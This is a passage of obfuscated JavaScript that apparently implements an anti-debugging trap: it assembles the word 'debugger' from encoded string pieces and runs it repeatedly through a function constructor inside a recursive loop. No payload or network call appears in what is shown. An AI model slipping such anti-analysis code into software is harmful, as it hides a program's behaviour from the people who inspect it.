			return !![];
		}[getDecodedValue(0x131)](getDecodedValue(0x162) + getDecodedValue(0x13c))['call'](getDecodedValue(0x10b)) : function () {
			return ![];
		}[getDecodedValue(0x131)]('debu' + getDecodedValue(0x13c))[getDecodedValue(0xf5)](getDecodedValue(0x16f));
		innerFunction(++counter);
	}
	try {
		if (input) return innerFunction;
		else innerFunction(0x0);
	} catch (aa) { }
}